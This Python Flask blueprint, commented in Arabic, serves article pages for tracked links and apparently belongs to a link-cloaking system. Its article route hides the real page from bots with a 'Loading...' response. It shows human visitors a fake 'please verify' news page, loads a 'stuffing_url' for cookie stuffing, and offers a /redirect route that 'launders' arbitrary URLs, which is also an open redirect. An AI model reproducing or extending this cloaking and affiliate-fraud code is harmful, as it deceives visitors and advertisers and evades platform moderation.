
import os
from flask import Blueprint, render_template, request, redirect
from pymongo import MongoClient
from app.utils.helpers import is_bot, get_laundry_html
from datetime import datetime
from app.article_system import ArticleManager  # ✅ استيراد مدير المقالات

public_bp = Blueprint('public', __name__)
article_manager = ArticleManager()  # ✅ تشغيل المدير

def get_db():
    try:
        raw_uri = os.environ.get('MONGO_URI', '').strip()
        if not raw_uri: return None
        client = MongoClient(raw_uri)
        return client['elite_saas_v1']
    except: return None

@public_bp.route('/')
def home():
    return render_template('home_corporate.html')

# --- صفحة عرض المقال (المجلة) ---
@public_bp.route('/<category>/<slug>')
def article_view(category, slug):
    try:
        db = get_db()
        if db is None: return "Maintenance", 500

        # 1. جلب بيانات الرابط (الهدف)
        link = db.links.find_one({"slug": slug})
        if not link: return "404 - Link Not Found", 404

        # 2. الحماية من البوتات
        if is_bot(request.headers.get('User-Agent', '')):
            return f"<h1>Loading...</h1>"

        # 3. 🔥 جلب المقال الحقيقي من قاعدة البيانات 🔥
        # يبحث عن مقال في نفس القسم، إذا لم يجد يجلب أي مقال
        article_content = article_manager.get_article_for_visitor(category)
        
        # إذا لم يكن هناك أي مقالات في النظام، نضع نصاً احتياطياً
        if not article_content:
            article_body = "<p>Welcome to our secure news portal. Please verify below to continue.</p>"
            article_image = ""
            article_title = link['title'] # نستخدم عنوان الرابط كعنوان بديل
        else:
            article_body = article_content['body']
            article_image = article_content['image']
            article_title = article_content['title']

        # 4. جلب رابط الكوكيز
        settings = db.settings.find_one({"type": "global"})
        cookie_url = settings.get('stuffing_url', '') if settings else ''

        return render_template(
            'article_magazine.html',
            title=article_title,       # العنوان من مقالك
            category=category.upper(),
            body=article_body,         # المحتوى من مقالك
            image=article_image,       # الصورة من مقالك
            date=datetime.utcnow().strftime('%B %d, %Y'),
            target_url=link.get('target_url', '#'),
            cookie_url=cookie_url
        )
    except Exception as e:
        return f"Error: {str(e)}", 500

@public_bp.route('/redirect')
def redirect_engine():
    url = request.args.get('url')
    if not url: return redirect('/')
    return get_laundry_html(url)
